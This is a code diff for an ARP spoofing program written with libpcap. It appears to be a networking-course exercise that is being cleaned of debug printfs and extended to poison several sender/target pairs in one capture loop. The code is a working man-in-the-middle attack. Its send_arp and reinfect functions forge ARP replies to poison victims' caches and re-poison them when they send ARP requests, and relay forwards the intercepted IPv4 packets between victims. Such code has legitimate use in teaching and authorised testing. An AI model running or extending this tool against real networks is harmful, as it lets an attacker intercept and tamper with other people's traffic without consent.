@@ -57,7 +57,7 @@ char* get_my_MAC(const char* iface) {
 char* get_my_IP(const char *iface) {
     	int fd;
     	struct ifreq ifr;
-    	static char ip[INET_ADDRSTRLEN]; // IP 주소를 저장할 버퍼
+    	static char ip[INET_ADDRSTRLEN];
     	fd = socket(AF_INET, SOCK_DGRAM, 0);
     	if (fd < 0) {
         	perror("socket");
@@ -113,10 +113,6 @@ Mac get_others_MAC(pcap_t* handle,char* dev,Ip s_IP, Ip m_IP, Mac m_MAC){
 		if(res_eth_packet->type()==EthHdr::Arp&&res_arp_packet->op()==ArpHdr::Reply&&res_arp_packet->sip()==Ip(s_IP)){
 			Mac sender_mac = Mac(res_eth_packet->smac_);
 			const uint8_t* mac_addr=(const uint8_t*)sender_mac;
-			for(int i=0;i<6;i++){
-				printf("%02x",mac_addr[i]);
-				printf(":");
-			}
 			return sender_mac;
 		}	
 	}
@@ -146,71 +142,49 @@ void send_arp(pcap_t* handle,char* dev, Mac s_MAC,Mac m_MAC,Ip s_IP, Ip t_IP){
 	return;
 }
 
-void relay(pcap_t* handle,char* dev,char* errbuf, Mac t_MAC,Mac m_MAC,Mac s_MAC, Ip s_IP, Ip t_IP){
-	struct pcap_pkthdr* header;
-	const u_char* pkt_data;
-	int res=pcap_next_ex(handle, &header, &pkt_data);
-	if(res==0){
-		return;
-	}
+void relay(pcap_t* handle,struct pcap_pkthdr* header,const unsigned char* pkt_data,char* dev,char* errbuf, Mac t_MAC,Mac m_MAC,Mac s_MAC, Ip s_IP, Ip t_IP){
 	struct EthHdr* res_eth_packet=(struct EthHdr*)pkt_data;
  	if(res_eth_packet->type()==EthHdr::Ip4){
 		struct IpHdr* res_Ip_packet=(struct IpHdr*)(pkt_data+sizeof(EthHdr));
-		printf("DES IP :%s, expected: %s",std::string(res_Ip_packet->d_addr).c_str(),std::string(Ip(t_IP)).c_str());
 		EthIpPacket Ippacket;
 		memcpy(&Ippacket.ip_,res_Ip_packet,sizeof(IpHdr));
 		memcpy(&Ippacket.eth_,res_eth_packet,sizeof(EthHdr));
 		Ippacket.eth_=*res_eth_packet;
 		if(ntohl(res_Ip_packet->d_addr)==Ip(t_IP)&&ntohl(res_Ip_packet->s_addr)==Ip(s_IP)){
-			printf("testcase 3-3\n");
 			res_eth_packet->dmac_ = Mac(t_MAC);
-			res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&Ippacket), sizeof(EthIpPacket));
+			int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&Ippacket), sizeof(EthIpPacket));
 			if (res != 0) {
 				fprintf(stderr, "3pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 			}
 		}
 		else if(ntohl(res_Ip_packet->d_addr)==Ip(s_IP)&&ntohl(res_Ip_packet->s_addr)==Ip(t_IP)){
-			printf("testcase 3-2\n");
 			res_eth_packet->dmac_=Mac(s_MAC);
-			res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&Ippacket), sizeof(EthIpPacket));
+			int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&Ippacket), sizeof(EthIpPacket));
 			if (res != 0) {
 				fprintf(stderr, "3pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 			}
-		}
-		else{
-			printf("wrong\n");
 		}
 	}
 	return;
 }
 
-void reinfect(pcap_t* handle,char* errbuf, char* dev, Mac s_MAC,Mac t_MAC, Mac m_MAC, Ip s_IP, Ip t_IP){
-	struct pcap_pkthdr* header;
-	const u_char* pkt_data;
-	int res=pcap_next_ex(handle, &header, &pkt_data);
-	if(res==0){
-		return;
-	}
+void reinfect(pcap_t* handle,struct pcap_pkthdr* header,const unsigned char* pkt_data,char* errbuf, char* dev, Mac s_MAC,Mac t_MAC, Mac m_MAC, Ip s_IP, Ip t_IP){
 	struct EthHdr* res_eth_packet=(struct EthHdr*)pkt_data;
 	if(res_eth_packet->type()==EthHdr::Arp){
 		struct ArpHdr* res_arp_packet=(struct ArpHdr*)(pkt_data+sizeof(EthHdr));
 		if(res_eth_packet->dmac()==Mac("ff:ff:ff:ff:ff:ff")&&res_arp_packet->op()==ArpHdr::Request&&res_arp_packet->sip()==Ip(t_IP)){
 			send_arp(handle,dev,s_MAC,m_MAC,s_IP,t_IP);
 			send_arp(handle,dev,t_MAC,m_MAC,t_IP,s_IP);
-			printf("test case1\n");
 		}
 		else if(res_eth_packet->dmac()==Mac("ff:ff:ff:ff:ff:ff")&&res_arp_packet->op()==ArpHdr::Request&&res_arp_packet->sip()==Ip(s_IP)){
 			send_arp(handle,dev,s_MAC,m_MAC,s_IP,t_IP);
 			send_arp(handle,dev,t_MAC,m_MAC,t_IP,s_IP);
-			printf("test case2\n");
 		}
 		else if(res_eth_packet->dmac()==Mac(m_MAC)&&res_arp_packet->sip()==Ip(s_IP)){
 			send_arp(handle,dev,s_MAC,m_MAC,s_IP,t_IP);
-			printf("test case3\n");
 		}
 		else if(res_eth_packet->dmac()==Mac(m_MAC)&&res_arp_packet->sip()==Ip(t_IP)){
 			send_arp(handle,dev,t_MAC,m_MAC,t_IP,s_IP);
-			printf("test case4\n");
 		}
 	}
 	return;
@@ -259,10 +233,22 @@ int main(int argc, char* argv[]) {
 		}
 		send_arp(handle,dev,send_MAC,my_MAC,send_IP,tar_IP);
 		send_arp(handle,dev,tar_MAC,my_MAC,tar_IP,send_IP);
-		while(1){
-		reinfect(handle,errbuf,dev,send_MAC,tar_MAC,my_MAC,send_IP,tar_IP);
-		relay(handle,errbuf,dev,tar_MAC,my_MAC,send_MAC,send_IP, tar_IP);
-		}
 	}
+		while(1){
+			struct pcap_pkthdr* header;
+			const u_char* pkt_data;
+			int res=pcap_next_ex(handle, &header, &pkt_data);
+			if(res==0){
+				continue;
+			}
+			for(int i=1;i<argc/2;i++){
+				Ip send_IP=Ip(argv[i*2]);
+				Ip tar_IP=Ip(argv[i*2+1]);
+				Mac send_MAC =ipmap[send_IP];
+				Mac tar_MAC=ipmap[tar_IP];
+				reinfect(handle,header,pkt_data,errbuf,dev,send_MAC,tar_MAC,my_MAC,send_IP,tar_IP);
+				relay(handle,header,pkt_data,errbuf,dev,tar_MAC,my_MAC,send_MAC,send_IP, tar_IP);
+			}
+		}
 	return 0;
 }
